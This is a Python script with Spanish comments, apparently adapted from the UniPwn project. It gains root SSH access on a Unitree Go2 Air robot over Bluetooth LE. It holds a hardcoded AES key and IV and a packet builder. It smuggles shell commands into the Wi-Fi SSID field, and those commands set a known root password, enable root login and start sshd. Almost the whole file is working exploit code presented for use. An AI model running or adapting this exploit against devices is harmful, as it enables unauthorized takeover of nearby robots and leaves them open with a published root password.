"""
Habilita SSH en Unitree Go2 Air via Bluetooth (BLE).
Basado en UniPwn: github.com/Bin4ry/UniPwn

Requisitos:
    pip install bleak pycryptodome

Uso:
    python habilitar_ssh_robot.py

Despues de ejecutar exitosamente:
    SSH: ssh root@192.168.12.1
    Contrasena: Bin4ryWasHere
"""

import asyncio
import sys
from bleak import BleakScanner, BleakClient
from Crypto.Cipher import AES

AES_KEY     = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
AES_IV      = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
NOTIFY_UUID = "0000ffe1-0000-1000-8000-00805f9b34fb"
WRITE_UUID  = "0000ffe2-0000-1000-8000-00805f9b34fb"
CHUNK_SIZE  = 14

SSH_CMD = (
    "echo 'root:Bin4ryWasHere'|chpasswd;"
    "sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;"
    "/etc/init.d/ssh start || systemctl start sshd || systemctl start ssh"
)


def aes_encrypt(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.encrypt(data)


def aes_decrypt(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.decrypt(data)


def create_packet(instruction: int, data_bytes: list = None) -> bytes:
    """
    Formato exacto de UniPwn:
      [0x52, length, instruction, ...data_bytes..., checksum]
    donde:
      length   = len([instruction] + data_bytes) + 3  (= tamano total del paquete)
      checksum = (-sum([0x52, length, instruction, ...data...])) & 0xFF
    """
    instruction_data = [instruction]
    if data_bytes:
        instruction_data.extend(data_bytes)
    length    = len(instruction_data) + 3
    full_data = [0x52, length] + instruction_data
    checksum  = (-sum(full_data)) & 0xFF
    plain     = bytes(full_data + [checksum])
    return aes_encrypt(plain)


async def send_chunked(client: BleakClient, instruction: int, data: bytes):
    """
    Envia datos en chunks de 14 bytes.
    Cada chunk lleva prefijo [num_chunk, total_chunks] antes de los datos.
    """
    total = (len(data) + CHUNK_SIZE - 1) // CHUNK_SIZE
    for i in range(total):
        chunk = list(data[i * CHUNK_SIZE:(i + 1) * CHUNK_SIZE])
        pkt   = create_packet(instruction, data_bytes=[i + 1, total] + chunk)
        await client.write_gatt_char(WRITE_UUID, pkt, response=True)
        print(f"    chunk {i+1}/{total}: {bytes(chunk)!r}")
        await asyncio.sleep(0.3)


async def find_robot() -> str | None:
    print("[*] Buscando robot por Bluetooth...")
    devices = await BleakScanner.discover(timeout=10)
    for d in devices:
        name = (d.name or "").lower()
        if any(k in name for k in ["go2", "unitree"]):
            print(f"[+] Encontrado: {d.name} ({d.address})")
            return d.address
    print("[-] Robot no encontrado. Asegurate de que este encendido y cerca.")
    return None


async def exploit(address: str):
    print(f"[*] Conectando a {address}...")
    async with BleakClient(address, timeout=20) as client:
        print("[+] Conectado!\n")

        def on_notify(sender, data: bytearray):
            dec = aes_decrypt(bytes(data))
            print(f"    [ROBOT] raw={data.hex()}  dec={dec!r}")

        await client.start_notify(NOTIFY_UUID, on_notify)

        # 1. Handshake
        print("[*] Paso 1: Handshake...")
        await client.write_gatt_char(WRITE_UUID,
            create_packet(1, list(b"unitree")), response=True)
        await asyncio.sleep(2)

        # 2. Solicitar SN
        print("[*] Paso 2: Solicitar SN...")
        await client.write_gatt_char(WRITE_UUID,
            create_packet(2), response=True)
        await asyncio.sleep(1.5)

        # 3. Inicializar modo red STA (byte 0x02)
        print("[*] Paso 3: Modo STA...")
        await client.write_gatt_char(WRITE_UUID,
            create_packet(3, [0x02]), response=True)
        await asyncio.sleep(1)

        # 4. SSID con inyeccion SSH (chunked)
        ssid_payload = f'";$({SSH_CMD});#'
        print(f"[*] Paso 4: SSID payload ({len(ssid_payload)} chars)...")
        await send_chunked(client, 4, ssid_payload.encode())
        await asyncio.sleep(0.5)

        # 5. Password (chunked)
        print("[*] Paso 5: Password WiFi...")
        await send_chunked(client, 5, b"00000000")
        await asyncio.sleep(0.5)

        # 6. Country code — dispara ejecucion
        print("[*] Paso 6: Disparando (country code)...")
        await client.write_gatt_char(WRITE_UUID,
            create_packet(6, list(b"CN")), response=True)
        await asyncio.sleep(5)

        await client.stop_notify(NOTIFY_UUID)

    print()
    print("=" * 55)
    print("[+] PAYLOAD ENVIADO")
    print("=" * 55)
    print()
    print("Espera 20 segundos, luego:")
    print("1. Conecta al WiFi del robot (pass: 00000000)")
    print("2. ssh root@192.168.12.1")
    print("3. Contrasena: Bin4ryWasHere")
    print()
    print("Si sigue 'Connection refused', el robot necesita reinicio.")
    print("Apagalo y enciendelo, luego intenta el SSH de nuevo.")


async def main():
    print("=" * 55)
    print("  HABILITAR SSH EN UNITREE Go2 Air via BLE")
    print("=" * 55)
    print()
    address = await find_robot()
    if not address:
        sys.exit(1)
    await exploit(address)


if __name__ == "__main__":
    asyncio.run(main())
